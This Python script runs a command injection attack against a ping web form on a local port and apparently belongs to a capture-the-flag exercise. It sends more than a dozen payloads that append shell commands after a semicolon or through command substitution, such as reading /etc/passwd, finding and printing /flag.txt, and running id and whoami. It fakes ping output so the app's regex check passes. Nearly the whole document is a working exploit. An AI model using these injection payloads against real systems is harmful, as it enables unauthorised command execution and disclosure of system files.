import requests
import re

url = "http://127.0.0.1:33052/ping"

# The regex pattern that needs to match
# '(.*?) packets transmitted, (.*?) received, (.*?)% packet loss'

# Test payloads using semicolon injection with fake ping output format
payloads = [
    # Basic test - just semicolon
    "127.0.0.1;id",
    
    # Fake ping output with echo
    '127.0.0.1;echo "2 packets transmitted, 2 received, 0% packet loss";id',
    
    # Different echo formats
    '127.0.0.1;echo "1 packets transmitted, 1 received, 0% packet loss";cat /flag.txt',
    
    # Using printf for more control
    '127.0.0.1;printf "1 packets transmitted, 1 received, 0%% packet loss\n";id',
    
    # Multiple commands
    '127.0.0.1;echo "3 packets transmitted, 3 received, 0% packet loss";ls -la',
    
    # Try to find flag with fake ping output
    '127.0.0.1;echo "1 packets transmitted, 1 received, 0% packet loss";find / -name "flag*" 2>/dev/null',
    
    # Check if command substitution works with semicolon
    '127.0.0.1;$(echo "1 packets transmitted, 1 received, 0% packet loss");id',
    
    # Using backticks with semicolon
    '127.0.0.1;`echo "1 packets transmitted, 1 received, 0% packet loss"`;id',
    
    # Shell injection with fake ping output and command
    '127.0.0.1;echo "1 packets transmitted, 1 received, 0% packet loss";whoami',
    
    # Try with path traversal
    '127.0.0.1;echo "1 packets transmitted, 1 received, 0% packet loss";cat /etc/passwd',
    
    # Using /bin/sh -c
    '127.0.0.1;/bin/sh -c "echo 1 packets transmitted, 1 received, 0% packet loss";id',
    
    # Multiple echoes
    '127.0.0.1;echo "1 packets transmitted, 1 received, 0% packet loss";echo "FLAG";id',
    
    # Testing if we can output just the required format
    'echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Combining ping with fake output
    '127.0.0.1;ping -c 1 127.0.0.1;id',
    
    # Try newline injection with semicolon
    '127.0.0.1;echo "1 packets transmitted, 1 received, 0% packet loss";echo "";id',
]

print("="*80)
print("Testing Ping Tool Command Injection")
print("Target: http://127.0.0.1:33052/ping")
print("="*80)

results = []

for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}] Payload: {payload}")
    print("-"*60)
    
    try:
        resp = requests.post(url, data={"ip_address": payload}, timeout=10)
        
        print(f"Status: {resp.status_code}")
        print(f"Response ({len(resp.text)} chars):")
        print(resp.text)
        
        # Check what we got back
        if "Invalid input" in resp.text:
            result = "FILTER_BLOCKED"
        elif "Packets Transmitted" in resp.text:
            result = "REGEX_MATCHED"
        elif "packet loss" in resp.text.lower():
            result = "PARTIAL_MATCH"
        elif any(cmd in resp.text.lower() for cmd in ['uid=', 'root', 'bin', 'flag', 'user']):
            result = "COMMAND_OUTPUT"
        else:
            result = "OTHER"
            
        results.append({
            'test': i,
            'payload': payload,
            'result': result,
            'response': resp.text
        })
        print(f"[RESULT] {result}")
        
    except Exception as e:
        print(f"ERROR: {e}")
        results.append({
            'test': i,
            'payload': payload,
            'result': f"ERROR: {e}",
            'response': ""
        })

# Summary
print("\n" + "="*80)
print("SUMMARY OF RESULTS")
print("="*80)

for r in results:
    print(f"[Test {r['test']:2d}] {r['result']:15s} | Payload: {r['payload'][:50]}...")

# Find successful injections
successful = [r for r in results if r['result'] in ['REGEX_MATCHED', 'COMMAND_OUTPUT']]
print(f"\n{'='*80}")
print(f"POTENTIALLY SUCCESSFUL: {len(successful)} payloads")
print("="*80)
for r in successful:
    print(f"\n[Test {r['test']}]")
    print(f"Payload: {r['payload']}")
    print(f"Response preview: {r['response'][:300]}...")

